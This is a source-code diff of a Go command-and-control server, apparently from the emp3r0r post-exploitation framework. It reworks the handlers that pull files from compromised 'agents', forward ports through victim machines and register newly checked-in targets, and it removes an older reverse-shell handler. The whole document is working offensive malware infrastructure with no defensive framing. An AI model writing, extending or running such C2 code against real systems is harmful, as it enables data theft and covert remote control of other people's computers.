@@ -1,7 +1,6 @@
 package cc
 
 import (
-	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
@@ -9,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -16,7 +16,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/google/uuid"
 	"github.com/gorilla/mux"
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
@@ -24,25 +24,36 @@ import (
 
 // StreamHandler allow the http handler to use H2Conn
 type StreamHandler struct {
-	H2x     *agent.H2Conn // h2conn with context
-	Buf     chan []byte   // buffer for receiving data
-	Token   string        // token string, for agent auth
-	BufSize int           // buffer size for reverse shell should be 1
-	Mutex   *sync.Mutex   // prevent concurrent write to map
+	H2x     *emp3r0r_data.H2Conn // h2conn with context
+	Buf     chan []byte          // buffer for receiving data
+	Token   string               // token string, for agent auth
+	BufSize int                  // buffer size for reverse shell should be 1
 }
 
 var (
 	// RShellStream reverse shell handler
-	RShellStream = &StreamHandler{H2x: nil, BufSize: agent.RShellBufSize, Buf: make(chan []byte)}
+	RShellStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.RShellBufSize, Buf: make(chan []byte)}
 
 	// ProxyStream proxy handler
-	ProxyStream = &StreamHandler{H2x: nil, BufSize: agent.ProxyBufSize, Buf: make(chan []byte)}
+	ProxyStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.ProxyBufSize, Buf: make(chan []byte)}
 
 	// FTPStreams file transfer handlers
 	FTPStreams = make(map[string]*StreamHandler)
 
+	// FTPMutex lock
+	FTPMutex = &sync.Mutex{}
+
+	// RShellStreams rshell handlers
+	RShellStreams = make(map[string]*StreamHandler)
+
+	// RShellMutex lock
+	RShellMutex = &sync.Mutex{}
+
 	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
 	PortFwds = make(map[string]*PortFwdSession)
+
+	// PortFwdsMutex lock
+	PortFwdsMutex = &sync.Mutex{}
 )
 
 // ftpHandler handles buffered data
@@ -52,17 +63,17 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		sh.H2x.Cancel != nil ||
 		sh.H2x.Conn != nil {
 		CliPrintError("ftpHandler: occupied")
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
 		return
 	}
 
 	var err error
-	sh.H2x = &agent.H2Conn{}
+	sh.H2x = &emp3r0r_data.H2Conn{}
 	// use h2conn
 	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
 	if err != nil {
 		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
 		return
 	}
 
@@ -90,7 +101,19 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		CliPrintError("%s failed to parse filename", sh.Token)
 		return
 	}
+	filename = util.FileBaseName(filename) // we dont want the full path
 	filewrite := FileGetDir + filename + ".downloading"
+	lock := FileGetDir + filename + ".lock"
+	// is the file already being downloaded?
+	if util.IsFileExist(lock) {
+		CliPrintError("%s is already being downloaded", filename)
+		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
+		return
+	}
+
+	// create lock file
+	_, err = os.Create(lock)
+
 	// FileGetDir
 	if !util.IsFileExist(FileGetDir) {
 		err = os.MkdirAll(FileGetDir, 0700)
@@ -109,10 +132,16 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		}
 		sh.Token = ""
 		sh.H2x.Cancel()
-		sh.Mutex.Lock()
+		FTPMutex.Lock()
 		delete(FTPStreams, filename)
-		sh.Mutex.Unlock()
+		FTPMutex.Unlock()
 		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)
+
+		// delete the lock file, unlock download session
+		err = os.Remove(lock)
+		if err != nil {
+			CliPrintWarning("Remove %s: %v", lock, err)
+		}
 
 		// have we finished downloading?
 		targetFile := FileGetDir + util.FileBaseName(filename)
@@ -127,35 +156,38 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 			CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
 			return
 		}
+		if nowSize > targetSize {
+			CliPrintError("Downloaded (%d of %d bytes), WTF?", nowSize, targetSize)
+			return
+		}
 		CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)
 	}()
 
-	go func() {
-		f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
-		if err != nil {
-			CliPrintError("processAgentData write file: %v", err)
-		}
-		defer f.Close()
-
-		// write the file
-		for filedata := range sh.Buf {
-			_, err = f.Write(filedata)
-			if err != nil {
-				CliPrintError("processAgentData failed to save file: %v", err)
-				return
-			}
-		}
-	}()
+	// open file for writing
+	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		CliPrintError("ftpHandler write file: %v", err)
+	}
+	defer f.Close()
 
 	// read filedata
 	for sh.H2x.Ctx.Err() == nil {
 		data := make([]byte, sh.BufSize)
-		_, err = sh.H2x.Conn.Read(data)
+		n, err := sh.H2x.Conn.Read(data)
 		if err != nil {
 			CliPrintWarning("Disconnected: ftpHandler read: %v", err)
 			return
 		}
-		sh.Buf <- data
+		if n < sh.BufSize {
+			data = data[:n]
+		}
+
+		// write the file
+		_, err = f.Write(data)
+		if err != nil {
+			CliPrintError("ftpHandler failed to save file: %v", err)
+			return
+		}
 	}
 }
 
@@ -163,7 +195,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
 	var (
 		err error
-		h2x agent.H2Conn
+		h2x emp3r0r_data.H2Conn
 	)
 	sh.H2x = &h2x
 	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
@@ -180,25 +212,24 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 	shCopy := *sh
 
 	// record this connection to port forwarding map
-	buf := make([]byte, sh.BufSize)
-	_, err = sh.H2x.Conn.Read(buf)
-
-	if err != nil {
-		CliPrintError("portFwd connection: handshake failed: %s\n%v", req.RemoteAddr, err)
+	if sh.H2x.Conn == nil {
+		CliPrintWarning("%s h2 disconnected", sh.Token)
 		return
 	}
-	buf = bytes.Trim(buf, "\x00")
-	origBuf := buf        // in case we need the orignal session-id, for sub-sessions
+
+	vars := mux.Vars(req)
+	token := vars["token"]
+	origToken := token    // in case we need the orignal session-id, for sub-sessions
 	isSubSession := false // sub-session is part of a port-mapping, every client connection starts a sub-session (h2conn)
-	if strings.Contains(string(buf), "_") {
+	if strings.Contains(string(token), "_") {
 		isSubSession = true
-		idstr := strings.Split(string(buf), "_")[0]
-		buf = []byte(idstr)
+		idstr := strings.Split(string(token), "_")[0]
+		token = idstr
 	}
 
-	sessionID, err := uuid.ParseBytes(buf)
+	sessionID, err := uuid.Parse(token)
 	if err != nil {
-		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", buf, req.RemoteAddr, err)
+		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", token, req.RemoteAddr, err)
 		return
 	}
 	// check if session ID exists in the map,
@@ -211,32 +242,34 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 	if !isSubSession {
 		pf.Sh[sessionID.String()] = &shCopy // cache this connection
 		// handshake success
-		CliPrintSuccess("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
+		CliPrintDebug("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
 	} else {
-		pf.Sh[string(origBuf)] = &shCopy // cache this connection
+		pf.Sh[string(origToken)] = &shCopy // cache this connection
 		// handshake success
-		if strings.HasSuffix(string(origBuf), "-reverse") {
-			CliPrintSuccess("Got a portFwd (reverse) connection (%s) from %s", string(origBuf), req.RemoteAddr)
+		if strings.HasSuffix(string(origToken), "-reverse") {
+			CliPrintDebug("Got a portFwd (reverse) connection (%s) from %s", string(origToken), req.RemoteAddr)
 			err = pf.RunReversedPortFwd(&shCopy) // handle this reverse port mapping request
 			if err != nil {
 				CliPrintError("RunReversedPortFwd: %v", err)
 			}
-			// } else {
-			// CliPrintInfo("Got a portFwd sub-connection (%s) from %s", string(origBuf), req.RemoteAddr)
+		} else {
+			CliPrintDebug("Got a portFwd sub-connection (%s) from %s", string(origToken), req.RemoteAddr)
 		}
 	}
 
 	defer func() {
-		err = sh.H2x.Conn.Close()
-		if err != nil {
-			CliPrintError("portFwdHandler failed to close connection: " + err.Error())
+		if sh.H2x.Conn != nil {
+			err = sh.H2x.Conn.Close()
+			if err != nil {
+				CliPrintError("portFwdHandler failed to close connection: " + err.Error())
+			}
 		}
 
 		// if this connection is just a sub-connection
 		// keep the port-mapping, only close h2conn
-		if string(origBuf) != sessionID.String() {
+		if string(origToken) != sessionID.String() {
 			cancel()
-			CliPrintInfo("portFwdHandler: closed connection %s", origBuf)
+			CliPrintDebug("portFwdHandler: closed connection %s", origToken)
 			return
 		}
 
@@ -263,69 +296,10 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 	}
 }
 
-// rshellHandler handles buffered data
-func (sh *StreamHandler) rshellHandler(wrt http.ResponseWriter, req *http.Request) {
-	// check if an agent is already connected
-	if sh.H2x.Ctx != nil ||
-		sh.H2x.Cancel != nil ||
-		sh.H2x.Conn != nil {
-		CliPrintError("rshellHandler: occupied")
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
-		return
-	}
-
-	var err error
-	// use h2conn
-	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
-	if err != nil {
-		CliPrintError("rshellHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
-		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
-		return
-	}
-
-	// agent auth
-	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
-	buf := make([]byte, sh.BufSize)
-	_, err = sh.H2x.Conn.Read(buf)
-	buf = bytes.Trim(buf, "\x00")
-	agentToken, err := uuid.ParseBytes(buf)
-	if err != nil {
-		CliPrintError("Invalid rshell token %s: %v", buf, err)
-		return
-	}
-	if agentToken.String() != sh.Token {
-		CliPrintError("Invalid rshell token '%s vs %s'", agentToken.String(), sh.Token)
-		return
-	}
-	CliPrintSuccess("Got a reverse shell connection (%s) from %s", sh.Token, req.RemoteAddr)
-
-	defer func() {
-		if sh.H2x.Conn != nil {
-			err = sh.H2x.Conn.Close()
-			if err != nil {
-				CliPrintError("rshellHandler failed to close connection: " + err.Error())
-			}
-		}
-		sh.Token = ""
-		sh.H2x.Cancel()
-		CliPrintWarning("Closed reverse shell connection from %s", req.RemoteAddr)
-	}()
-
-	for {
-		data := make([]byte, sh.BufSize)
-		_, err = sh.H2x.Conn.Read(data)
-		if err != nil {
-			CliPrintWarning("Disconnected: rshellHandler read: %v", err)
-			return
-		}
-		sh.Buf <- data
-	}
-}
-
 func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 	vars := mux.Vars(req)
 
-	var rshellConn, proxyConn agent.H2Conn
+	var rshellConn, proxyConn emp3r0r_data.H2Conn
 	RShellStream.H2x = &rshellConn
 	ProxyStream.H2x = &proxyConn
 
@@ -348,8 +322,6 @@ func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 			}
 		}
 		wrt.WriteHeader(http.StatusForbidden)
-	case tun.ReverseShellAPI:
-		RShellStream.rshellHandler(wrt, req)
 	case tun.ProxyAPI:
 		ProxyStream.portFwdHandler(wrt, req)
 	default:
@@ -376,7 +348,7 @@ func TLSServer() {
 	http.Handle("/", r)
 
 	// emp3r0r.crt and emp3r0r.key is generated by build.sh
-	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", agent.CCPort), "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
+	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", emp3r0r_data.CCPort), "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
 	if err != nil {
 		log.Println(color.RedString("Start HTTPS server: %v", err))
 	}
@@ -384,7 +356,7 @@ func TLSServer() {
 
 // receive checkin requests from agents, add them to `Targets`
 func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
-	var target agent.SystemInfo
+	var target emp3r0r_data.SystemInfo
 	jsonData, err := ioutil.ReadAll(req.Body)
 	defer req.Body.Close()
 	if err != nil {
@@ -401,14 +373,22 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 	// set target IP
 	target.IP = req.RemoteAddr
 
-	if !agentExists(&target) {
+	if !IsAgentExist(&target) {
 		inx := assignTargetIndex()
 		Targets[&target] = &Control{Index: inx, Conn: nil}
 		shortname := strings.Split(target.Tag, "-agent")[0]
-		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s, "+
-			"running '%s'\n",
-			inx, shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
-			target.OS)
+		// set labels
+		if util.IsFileExist(AgentsJSON) {
+			var mutex = &sync.Mutex{}
+			if l := SetAgentLabel(&target, mutex); l != "" {
+				shortname = l
+			}
+		}
+		CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", inx)
+		CliMsg("%s from %s, "+
+			"running %s\n",
+			shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
+			strconv.Quote(target.OS))
 	}
 }
 
@@ -426,7 +406,9 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 		for t, c := range Targets {
 			if c.Conn == conn {
 				delete(Targets, t)
-				CliPrintWarning("msgTunHandler: agent [%d]:%s disconnected\n", c.Index, t.Tag)
+				SetDynamicPrompt()
+				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
+				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
 				break
 			}
 		}
@@ -440,7 +422,7 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 	var (
 		in  = json.NewDecoder(conn)
 		out = json.NewEncoder(conn)
-		msg agent.MsgTunData
+		msg emp3r0r_data.MsgTunData
 	)
 
 	// Loop forever until the client hangs the connection, in which there will be an error
@@ -456,7 +438,7 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 		if msg.Payload == "hello" {
 			err = out.Encode(msg)
 			if err != nil {
-				CliPrintWarning("msgTunHandler cannot send hello to agent [%s]", msg.Tag)
+				CliPrintWarning("msgTunHandler cannot send hello to agent %s", msg.Tag)
 				return
 			}
 		}
